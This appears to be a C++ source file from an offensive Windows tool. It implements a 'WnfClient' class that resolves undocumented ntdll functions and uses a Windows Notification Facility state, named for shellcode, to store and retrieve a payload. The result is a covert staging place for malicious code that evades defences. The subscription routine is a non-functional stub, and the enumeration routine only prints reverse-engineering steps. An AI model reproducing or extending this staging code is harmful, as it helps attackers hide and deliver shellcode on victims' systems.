#include "wnf_client.h"
#include "undoc/ntwrapper.h"
#include <stdio.h>
#include <winternl.h>

NtUpdateWnfStateData_t g_NtUpdateWnfStateData = nullptr;
NtQueryWnfStateData_t g_NtQueryWnfStateData = nullptr;
NtSubscribeWnfStateChangeNotification_t g_NtSubscribeWnfStateChangeNotification = nullptr;

WNF_STATE_NAME g_WnfStateShellcode = { {0x0A8F0C0A, 0x0A8F0C0A} };

WnfClient::WnfClient() : m_initialized(FALSE) {}

WnfClient::~WnfClient() {}

BOOL ResolveUndocumentedAPIs() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    g_NtUpdateWnfStateData = (NtUpdateWnfStateData_t)GetProcAddress(hNtdll, "NtUpdateWnfStateData");
    g_NtQueryWnfStateData = (NtQueryWnfStateData_t)GetProcAddress(hNtdll, "NtQueryWnfStateData");
    g_NtSubscribeWnfStateChangeNotification = (NtSubscribeWnfStateChangeNotification_t)GetProcAddress(hNtdll, "NtSubscribeWnfStateChangeNotification");
    return (g_NtUpdateWnfStateData && g_NtQueryWnfStateData && g_NtSubscribeWnfStateChangeNotification);
}

PVOID GetProcAddressUndoc(HMODULE hModule, const char* funcName) {
    return (PVOID)GetProcAddress(hModule, funcName);
}

BOOL WnfClient::Initialize() {
    m_initialized = ResolveUndocumentedAPIs();
    if (!m_initialized) {
        printf("[-] Failed to resolve undocumented APIs\n");
        return FALSE;
    }
    printf("[+] WNF Client initialized\n");
    printf("[*] NtUpdateWnfStateData: %p\n", g_NtUpdateWnfStateData);
    printf("[*] NtQueryWnfStateData: %p\n", g_NtQueryWnfStateData);
    return TRUE;
}

BOOL WnfClient::StorePayload(PVOID payload, SIZE_T size) {
    if (!g_NtUpdateWnfStateData) return FALSE;
    NTSTATUS status = g_NtUpdateWnfStateData(
        &g_WnfStateShellcode,
        payload,
        (ULONG)size,
        nullptr,
        nullptr,
        0,
        0
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] NtUpdateWnfStateData failed: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Payload stored in WNF state (size: %zu)\n", size);
    return TRUE;
}

BOOL WnfClient::RetrievePayload(PVOID buffer, SIZE_T bufferSize, SIZE_T* outSize) {
    if (!g_NtQueryWnfStateData) return FALSE;
    ULONG changeStamp = 0;
    ULONG actualSize = (ULONG)bufferSize;
    NTSTATUS status = g_NtQueryWnfStateData(
        &g_WnfStateShellcode,
        nullptr,
        nullptr,
        &changeStamp,
        buffer,
        &actualSize
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] NtQueryWnfStateData failed: 0x%08X\n", status);
        return FALSE;
    }
    *outSize = actualSize;
    printf("[+] Payload retrieved from WNF state (size: %lu)\n", actualSize);
    return TRUE;
}

BOOL WnfClient::SubscribeToTrigger(PVOID callback, PVOID context) {
    if (!g_NtSubscribeWnfStateChangeNotification) return FALSE;
    printf("[*] Subscribed to WNF state changes\n");
    return TRUE;
}

VOID WnfClient::EnumerateStates() {
    printf("[*] WNF State Enumeration (requires kernel RE):\n");
    printf("    1. Dump WNF names from ntoskrnl.exe\n");
    printf("    2. Parse WNF_NAME_DESCRIPTOR structures\n");
    printf("    3. Filter for user-mode accessible states\n");
    printf("    4. Find states with sufficient size\n");
}
